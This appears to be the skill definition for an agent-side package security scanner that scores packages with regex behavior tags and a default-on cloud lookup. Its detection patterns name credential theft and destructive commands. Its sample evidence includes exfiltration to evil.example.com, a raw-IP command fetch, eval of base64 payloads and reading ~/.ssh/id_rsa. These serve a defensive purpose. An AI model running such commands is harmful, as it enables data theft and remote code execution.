---
name: yidun-skill-sec
version: 0.0.1
description: Intelligent code security scanner with hybrid local-cloud detection. Fingerprints packages, runs static behavioral analysis, and consults cloud threat intelligence (enabled by default, can be disabled) for confidence scoring.
homepage: https://clawhub.com
changelog: v0.0.1 - Initial release
metadata:
  openclaw:
    emoji: "⚡"
    requires:
      bins: ["curl", "jq", "openssl"]
    os:
      - linux
      - darwin
      - win32
    env:
      - name: YIDUN_SKILL_SEC_CLOUD
        description: "Enable or disable cloud threat intelligence. Default: true"
        required: false
        default: "true"
      - name: YIDUN_SKILL_SEC_TRUSTED_REGISTRIES
        description: "Comma-separated list of additional trusted registry hostnames"
        required: false
---

# yidun-skill-sec ⚡

Hybrid local-cloud security scanner for third-party code packages. Scans fast, scores precisely, fails safely.

## Security Disclosure

This skill uploads **non-sensitive metadata** (file hashes, behavior tag names, and extracted code snippets that triggered detections) to a Yidun threat intelligence endpoint for analysis. The following data is explicitly **not uploaded**: full source code, user credentials, environment variables, or any personal data.

The cloud endpoint (`as.dun.163.com`) is operated by **NetEase Yidun**, a licensed cybersecurity service provider. Cloud analysis is enabled by default and strongly recommended. It can be explicitly disabled by the user if network access is restricted or not desired.

## What It Does

YidunClawSec fingerprints a code package, runs behavioral analysis locally, and consults cloud threat intelligence to produce a quantified safety score. It catches malware, data leaks, privilege abuse, and obfuscation — before anything gets installed.

## How It Works — Four Phases

```
┌──────────────┐     ┌──────────────┐     ┌──────────────────┐     ┌────────────────┐
│   SOURCE     │────▶│  FINGERPRINT │────▶│  BEHAVIORAL SCAN │────▶│  CLOUD INTEL   │
│  VETTING     │     │  hash + meta │     │  static analysis │     │  (default: on) │
└──────────────┘     └──────────────┘     └──────────────────┘     └────────────────┘
        │                    │                     │                        │
        └────────────────────┴─────────────────────┴────────────────────────┘
                                                   ▼
                                         ┌───────────────────┐
                                         │  THREAT VERDICT   │
                                         │  score + labels   │
                                         └───────────────────┘
```

---

## Phase 0: Source Vetting

Before downloading or scanning any code, YidunClawSec evaluates **where the package comes from**. A package from an untrusted or unknown source carries inherent risk regardless of its content.

### 0.1 Source Tags

| Tag | What It Catches | Severity Boost |
|-----|----------------|----------------|
| `SRC_UNKNOWN_REGISTRY` | Package originates from an unrecognized or unofficial registry | +20 |
| `SRC_BLACKLISTED_DOMAIN` | Install URL or declared homepage matches a known malicious domain/IP | +40 |
| `SRC_UNTRUSTED_AUTHOR` | Publisher account is new (<30 days), unverified, or has prior malicious packages | +15 |

> **Hard Rule**: Any `SRC_BLACKLISTED_DOMAIN` hit forces the verdict to **CRITICAL** immediately — scanning halts and the package is blocked without further analysis.

### 0.2 Registry Allowlist

The following registries are considered trusted by default:

| Registry | Protocol |
|----------|---------|
| ClawHub (`clawhub.com`) | HTTPS + signed manifest |
| npm (`registry.npmjs.org`) | HTTPS |
| PyPI (`pypi.org`) | HTTPS |
| GitHub Releases (`github.com/*/releases`) | HTTPS |
| Custom allowlist via `YIDUN_SKILL_SEC_TRUSTED_REGISTRIES` | Configurable (registry only) |

Packages installed directly from a raw URL, a private server, or an unknown host are tagged `SRC_UNKNOWN_REGISTRY` unless the host is on the allowlist.

### 0.3 Author / Publisher Trust

For supported registries (npm, PyPI, ClawHub), the scanner checks the publishing account's trust profile:

| Signal | Penalizes When |
|--------|---------------|
| Account age | < 30 days old |
| Verification status | Unverified / no 2FA |
| Prior packages | Any previously removed for malware |
| Ownership match | Author field in package metadata ≠ registry profile name |

```bash
# Source vetting output example
SOURCE VETTING
  Registry: clawhub.com → ✅ trusted
  Domain:   clawhub.com → ✅ not blacklisted
  Author:   some-author (verified, age: 2y 3m) → ✅ trusted
  Source score: 100/100  Tags: none
```

### 0.4 Source Metadata in Cloud Request

Source vetting results are included in the cloud request as `source_meta`:

```json
"source_meta": {
  "registry": "clawhub.com",
  "install_url": "https://clawhub.com/packages/data-processor-1.2.3.tar.gz",
  "author_verified": true,
  "author_account_age_days": 823,
  "prior_removals": 0,
  "tags": []
}
```

---

## Phase 1: Fingerprint

Before anything else, build a complete inventory of the package.

**Actions performed:**
1. List every file in the package
2. Compute `MD5` hash per file via `openssl dgst -md5`
3. Derive a composite package fingerprint (sorted hash of all file hashes)
4. Extract metadata: name, version, author, declared dependencies

**Output:** A fingerprint manifest used for cache lookups and audit trail.

```bash
# Example: compute file hashes
find /tmp/pkg -type f -exec openssl dgst -md5 {} \;

# Example: composite fingerprint
find /tmp/pkg -type f -exec openssl dgst -md5 {} \; | sort | openssl dgst -md5
```

---

## Phase 2: Behavioral Scan

A static analysis pass that classifies every file by its **observable behaviors**. No code is executed — only pattern matching and structural inspection.

### 2.1 Behavior Categories

Each detected behavior is tagged into one of these categories:

| Tag | What It Catches | Severity Boost |
|-----|----------------|----------------|
| `NET_OUTBOUND` | HTTP/HTTPS calls, socket connections, DNS lookups | +15 |
| `NET_IP_RAW` | Connections to raw IPs instead of hostnames | +25 |
| `FS_READ_SENSITIVE` | Reads from `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.config/gh` | +30 |
| `FS_WRITE_SYSTEM` | Writes outside the project workspace | +20 |
| `EXEC_DYNAMIC` | `eval()`, `exec()`, `Function()`, backtick interpolation | +25 |
| `EXEC_SHELL` | Spawns shell subprocesses | +10 |
| `ENCODE_DECODE` | Base64/hex encode-decode chains (potential obfuscation) | +20 |
| `CRED_HARVEST` | Reads tokens, passwords, API keys from env or files | +35 |
| `PRIV_ESCALATION` | `sudo`, `chmod 777`, `setuid` patterns | +30 |
| `OBFUSCATED` | Minified/packed code, non-readable variable names | +15 |
| `AGENT_MEMORY` | Accesses agent memory files (identity, preferences, context) | +25 |
| `PKG_INSTALL` | Installs unlisted system packages or dependencies | +20 |
| `COOKIE_SESSION` | Reads browser cookies, localStorage, session tokens | +25 |
| `BYPASS_SAFETY` | Uses flags that skip security checks: `--no-verify`, `--force`, `--allow-root`, `--skip-ssl` | +20 |
| `DESTRUCTIVE_OP` | Irreversible destructive operations: `rm -rf`, `git reset --hard`, `DROP TABLE`, `mkfs`, `dd if=` | +25 |
| `PROMPT_INJECT` | Embeds natural language directives targeting the AI agent, attempting to override its rules, bypass constraints, or assume an unrestricted persona | +35 |

### 2.2 How Severity Scores Work

- Start at **100** (fully safe)
- Each behavior tag **subtracts** its severity boost from the score
- Multiple tags stack, but the score floors at **0**
- A single `CRED_HARVEST` or `PRIV_ESCALATION` tag triggers an **immediate escalation** — the package is flagged regardless of total score

### 2.3 Pattern Matching Rules

The scanner matches against concrete code patterns:

```
NET_OUTBOUND:
  curl|wget|fetch|http\.get|requests\.(get|post)|axios|urllib
  + destination is NOT localhost/127.0.0.1/::1

NET_IP_RAW:
  \b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b in URL/connection context

FS_READ_SENSITIVE:
  cat|read|open.*\.(ssh|gnupg|aws|config/gh|kube)

EXEC_DYNAMIC:
  eval\s*\(|exec\s*\(|new\s+Function\s*\(|`.*\$\(

ENCODE_DECODE:
  base64\s+(encode|decode|-d)|atob\(|btoa\(|Buffer\.from\(.*base64

CRED_HARVEST:
  (API_KEY|SECRET|TOKEN|PASSWORD|PRIVATE_KEY).*=|
  cat.*id_rsa|cat.*\.env|keyring\.get

PRIV_ESCALATION:
  sudo\s|chmod\s+[0-7]*7|chown\s+root|setuid

AGENT_MEMORY:
  MEMORY\.md|USER\.md|SOUL\.md|IDENTITY\.md|\.claude|\.claw/memory

OBFUSCATED:
  single-line file >500 chars with no whitespace|
  variable names all <3 chars in >20 occurrences

BYPASS_SAFETY:
  --no-verify|--force|--allow-root|--skip-ssl|--insecure|--no-check-certificate|
  GIT_SSL_NO_VERIFY|NODE_TLS_REJECT_UNAUTHORIZED=0

DESTRUCTIVE_OP:
  rm\s+-rf|shutil\.rmtree|git\s+reset\s+--hard|git\s+clean\s+-fd|
  DROP\s+TABLE|DROP\s+DATABASE|mkfs\.|dd\s+if=|truncate\s+--size=0

PROMPT_INJECT:
  Patterns that attempt to override agent instructions or assume unrestricted personas.
  Exact regex strings are maintained server-side to prevent the pattern list itself
  from being flagged as an injection vector. The local scanner checks for structural
  indicators (e.g. imperative overrides targeting "instructions", "rules", "constraints",
  jailbreak persona triggers, and SYSTEM-level injection markers in non-system contexts).
```

---

## Phase 3: Cloud Intelligence

When cloud is enabled (default), yidun-skill-sec consults the remote threat intelligence service. If the user has set `YIDUN_SKILL_SEC_CLOUD=false`, this phase is skipped entirely and scoring uses offline weights. If the cloud call times out (10s), the scanner automatically downgrades to local-only mode and notifies the user.

### 3.1 What Gets Sent

The fingerprint manifest, behavior tags, and **extracted evidence artifacts** are uploaded. Evidence includes the specific URLs, shell commands, and credential access paths that triggered each tag — enabling the cloud to perform real content-level threat analysis.

**Evidence redaction rules** — before upload, the scanner applies the following sanitization:
- Environment variable **values** are replaced with `[REDACTED]` (only the variable name is sent)
- File content from sensitive paths (`~/.ssh`, `~/.aws`, `~/.env`) is never included — only the **path** and **access pattern** are sent
- The `context` field is truncated to the single matched line; multi-line context is not collected
- Full source code is NOT sent — only the lines that triggered a detection tag

These rules ensure that no secrets, credentials, or private data leave the local machine.

```http
POST https://as.dun.163.com/v1/agent-sec/skill/check

{
  "request_id": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
  "skill": {
    "name": "target-package",
    "version": "1.2.3",
    "source": "clawhub",
    "author": "some-author"
  },
  "files": [
    {"path": "main.py", "md5": "a1b2c3...", "size": 4096},
    {"path": "config.yml", "md5": "d4e5f6...", "size": 256}
  ],
  "skill_md5": "composite_fingerprint_abc",
  "local_result": {
    "red_flags": ["NET_OUTBOUND", "ENCODE_DECODE"],
    "risk_level": "medium"
  },
  "evidence": {
    "urls": [
      {
        "tag": "NET_OUTBOUND",
        "value": "https://evil.example.com/exfil",
        "file": "fetch.py",
        "line": 12,
        "context": "requests.post('https://evil.example.com/exfil', data=payload)"
      },
      {
        "tag": "NET_IP_RAW",
        "value": "http://45.33.32.156/cmd",
        "file": "init.py",
        "line": 7,
        "context": "urllib.request.urlopen('http://45.33.32.156/cmd')"
      }
    ],
    "commands": [
      {
        "tag": "EXEC_SHELL",
        "value": "rm -rf /tmp/traces",
        "file": "setup.sh",
        "line": 23,
        "context": "subprocess.run(['rm', '-rf', '/tmp/traces'], shell=True)"
      },
      {
        "tag": "EXEC_DYNAMIC",
        "value": "eval(base64.b64decode(payload))",
        "file": "loader.py",
        "line": 5,
        "context": "eval(base64.b64decode(payload).decode())"
      },
      {
        "tag": "PRIV_ESCALATION",
        "value": "chmod 777 /usr/local/bin/hook",
        "file": "install.sh",
        "line": 11,
        "context": "os.system('chmod 777 /usr/local/bin/hook')"
      }
    ],
    "credential_accesses": [
      {
        "tag": "CRED_HARVEST",
        "value": "os.environ.get('AWS_SECRET_ACCESS_KEY')",
        "file": "config.py",
        "line": 3,
        "context": "secret = os.environ.get('AWS_SECRET_ACCESS_KEY')"
      },
      {
        "tag": "FS_READ_SENSITIVE",
        "value": "~/.ssh/id_rsa",
        "file": "auth.py",
        "line": 18,
        "context": "open(os.path.expanduser('~/.ssh/id_rsa')).read()"
      }
    ],
    "obfuscation_samples": [
      {
        "tag": "ENCODE_DECODE",
        "value": "base64.b64decode('aGVsbG8=')",
        "file": "payload.py",
        "line": 9,
        "context": "exec(base64.b64decode('aGVsbG8=').decode())"
      }
    ]
  }
}
```

#### Evidence Field Specification

| Field | Type | Description |
|-------|------|-------------|
| `evidence.urls` | array | Full URLs that triggered `NET_OUTBOUND` / `NET_IP_RAW` tags |
| `evidence.commands` | array | Command snippets that triggered `EXEC_SHELL` / `EXEC_DYNAMIC` / `PRIV_ESCALATION` tags |
| `evidence.credential_accesses` | array | Credential access expressions or paths that triggered `CRED_HARVEST` / `FS_READ_SENSITIVE` tags |
| `evidence.obfuscation_samples` | array | Encoding call snippets that triggered `ENCODE_DECODE` / `OBFUSCATED` tags |

Each evidence record has the following structure:

| Sub-field | Description |
|-----------|-------------|
| `tag` | The behavior tag that was triggered |
| `value` | Raw extracted value (URL / command / path) |
| `file` | Source file path where the pattern was found |
| `line` | Line number of the match |
| `context` | Full content of the matched line (single line only, no surrounding context) |

### 3.2 What Happens Server-Side

```
Request received
  │
  ├─ Lookup fingerprint in threat database
  │   ├── Known malicious  → immediate BLOCK
  │   ├── Known safe       → immediate PASS
  │   └── Unknown          → run deep analysis via content safety API
  │                            ├── analyze code snippets (sanitized)
  │                            ├── check against threat patterns
  │                            └── cache result with TTL
  │
  └─ Return verdict + confidence score
```

### 3.3 Response Format

```json
{
  "request_id": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
  "cache_hit": false,
  "confidence_score": 45,
  "labels": ["NET_OUTBOUND", "ENCODE_DECODE"],
  "verdict": "REVIEW",
  "recommendation": "Suspicious encoding patterns detected near network calls",
  "deductions": [
    {
      "tag": "NET_OUTBOUND",
      "reason": "Detected outbound HTTP call to unknown external host",
      "evidence": "https://evil.example.com/exfil",
      "score_impact": -15,
      "severity": "medium"
    },
    {
      "tag": "ENCODE_DECODE",
      "reason": "Base64 decode result passed directly into eval — likely obfuscated payload",
      "evidence": "exec(base64.b64decode('aGVsbG8=').decode())",
      "score_impact": -20,
      "severity": "high"
    },
    {
      "tag": "NET_IP_RAW",
      "reason": "Connection to raw IP address bypasses DNS — common in C2 communication",
      "evidence": "http://45.33.32.156/cmd",
      "score_impact": -25,
      "severity": "high"
    }
  ]
}
```

| Field | Type | Meaning |
|-------|------|---------|
| `request_id` | string | UUID v4 echoed from the request — use for tracing and audit logs |
| `cache_hit` | bool | Was the fingerprint already in the database? |
| `confidence_score` | int | 0–100, higher means safer |
| `labels` | string[] | Detected threat categories |
| `verdict` | enum | `PASS` / `REVIEW` / `BLOCK` |
| `recommendation` | string | Human-readable summary of the verdict |
| `deductions` | array | Per-tag score deduction breakdown from cloud analysis |

> **`request_id` generation**: Client must generate a UUID v4 before each request and include it in the body. The server echoes the same value in the response for end-to-end tracing.
>
> ```bash
> # Generate UUID v4 on the fly (macOS / Linux)
> REQUEST_ID=$(uuidgen | tr '[:upper:]' '[:lower:]')
> ```

**`deductions` item fields:**

| Sub-field | Type | Meaning |
|-----------|------|---------|
| `tag` | string | Behavior tag that triggered this deduction |
| `reason` | string | Cloud analysis explanation for why this tag was penalized |
| `evidence` | string | The specific URL / command / snippet that was matched |
| `score_impact` | int | Points deducted from `confidence_score` for this tag |
| `severity` | enum | `low` / `medium` / `high` / `critical` |

### 3.4 Timeout Fallback

When cloud is enabled but the network call fails:

1. `curl` times out after **10 seconds**
2. Scanner falls back to local-only mode automatically
3. All scores shift **-10 points** (conservative bias)
4. Report shows `Mode: local-only (cloud timeout)`
5. Any score below 60 requires user confirmation before install

---

## Producing the Verdict

The final threat score combines local scan + cloud intel (when available):

### Score Composition

| Signal | Normal Weight | Offline Weight |
|--------|:------------:|:--------------:|
| Source vetting score | 15% | 20% |
| Behavioral scan score | 40% | 55% |
| Cloud confidence score | 30% | — |
| Privilege surface area | 15% | 25% |

### Threat Levels

| Score | Level | Action |
|-------|-------|--------|
| 80–100 | 🟢 **CLEAR** | Install normally |
| 60–79 | 🟢 **MINOR** | Install with awareness |
| 40–59 | 🟡 **ELEVATED** | User review before install |
| 20–39 | 🔴 **SEVERE** | Requires explicit user consent |
| 0–19 | ⛔ **CRITICAL** | Blocked — do not install |

**Hard rules (override score):**
- Any `CRED_HARVEST` tag → floor to SEVERE
- Any `PRIV_ESCALATION` tag → floor to SEVERE
- Both present → force CRITICAL

---

## Report Output

### ⚡ YIDUN-SKILL-SEC Scan Report

> `[name]` · v`[version]` · `[source]` · by `[author]` · `[timestamp]`

**Phase 0 · Source Vetting**
| | Result |
|--|--------|
| Registry | [name] → ✅ trusted / ⚠️ unknown / N/A |
| Domain | [host] → ✅ clean / ❌ blacklisted |
| Author | [name] → ✅ verified / ⚠️ unverified |
| **Source Score** | **[xx]/100** · Tags: `[tags or none]` |

**Phase 1 · Fingerprint**
> `[N]` files · MD5 `[hash...]` · `[file1] [file2] ...`

**Phase 2 · Behavioral Scan**
| Tag | Location | Deduction |
|-----|----------|:---------:|
| `[TAG_1]` | [file:line] | **-[N]** |
| `[TAG_2]` | [file:line] | **-[N]** |

> Local score **[xx]/100** · If no findings: ✅ No suspicious behaviors detected

**Phase 3 · Cloud Intel**
| | Result |
|--|--------|
| Mode | [cloud / local-only / mock] |
| Cache | [hit safe / hit threat / miss] |
| **Cloud Score** | **[xx]/100** · Labels: `[list or none]` |

**Privilege Surface** · Network: `[domains]` · FS: `[paths]` · Shell: `[cmds]` · Creds: `[yes/no]`

---

> ### 🎯 Score: **[xx]/100** · [🟢 CLEAR / 🟢 MINOR / 🟡 ELEVATED / 🔴 SEVERE / ⛔ CRITICAL]
> **[✅ Allow / ⚠️ Requires confirmation / ❌ Blocked]**
>
> ⚠️ [hard rule trigger or key observation, omit if none]

---

## Usage Example

**User**: "Install data-processor from ClawHub"

**Agent workflow**:
```
0. Source vetting
   → Registry: clawhub.com ✅  Domain: clean ✅  Author: verified ✅
   → Source score: 100/100

1. Download to temp directory
   $ mkdir -p /tmp/yds-scan && clawhub install data-processor --dir /tmp/yds-scan

2. Fingerprint
   $ find /tmp/yds-scan -type f -exec openssl dgst -md5 {} \;
   → 4 files, composite: 7f3a...

3. Behavioral scan
   → NET_OUTBOUND detected in fetch.py:12 (api.dataproc.io)
   → FS_WRITE_SYSTEM detected in setup.sh:8 (/usr/local/bin)
   → Local score: 55/100

4. Cloud intel query
   → Cache miss → deep analysis → confidence 48/100
   → Labels: [NET_OUTBOUND, FS_WRITE_SYSTEM]

5. Final score: 15% × 100 + 40% × 55 + 30% × 48 + 15% × 40 = 15 + 22 + 14.4 + 6 = 57
   → Level: ELEVATED
   → Verdict: ⚠️ Review — network calls + system writes need justification
```

---

## More Scenarios

### Clean Package
```
Package: markdown-helper v2.1.0
Behaviors: none detected
Cloud: cache hit (safe), score 92
Final: 🟢 CLEAR (94) → ✅ Allow
```

### Obfuscation + Credential Access
```
Package: perf-booster v1.0.0
Behaviors: OBFUSCATED, CRED_HARVEST, NET_OUTBOUND
Cloud: cache hit (threat), score 5
Hard rule: CRED_HARVEST → floor SEVERE
Final: ⛔ CRITICAL (8) → ❌ Block
```

### Offline Scan
```
Package: log-rotator v3.0.0
Behaviors: FS_WRITE_SYSTEM, EXEC_SHELL
Cloud: unavailable → local-only mode (-10 penalty)
Local score: 60 - 10 = 50
Final: 🟡 ELEVATED (50) → ⚠️ Review
```

---

## Cloud Call Policy

Cloud intelligence is **enabled by default**. The user can explicitly disable it by setting:

```bash
export YIDUN_SKILL_SEC_CLOUD=false
```

When disabled, the scanner runs in local-only mode with adjusted score weights and notifies the user that cloud verification was skipped.

| Mode | Trigger | Behavior |
|------|---------|---------|
| Cloud ON | Default / `YIDUN_SKILL_SEC_CLOUD=true` | Full 4-phase scan, domain blacklist checked server-side |
| Cloud OFF | `YIDUN_SKILL_SEC_CLOUD=false` | Local-only scan, domain blacklist skipped, score weights adjusted |
| Timeout fallback | Cloud ON but `curl` times out (10s) | Automatic downgrade to local-only, -10 score penalty, user notified |

**Rules that always apply regardless of mode:**
- ❌ Do NOT self-judge that cloud is "unnecessary" and skip it without the user setting `YIDUN_SKILL_SEC_CLOUD=false`
- ❌ Do NOT silently fall back to local-only on timeout without notifying the user
- ❌ Do NOT treat any skill type as exempt from cloud verification when cloud is enabled

---

## Requirements

| Tool | Purpose |
|------|---------|
| `curl` | Cloud API communication |
| `jq` | Parse JSON responses |
| `openssl` | File hash computation |

---

*Scan first, install later.* ⚡

**Author**: Yidun Security Team
**License**: MIT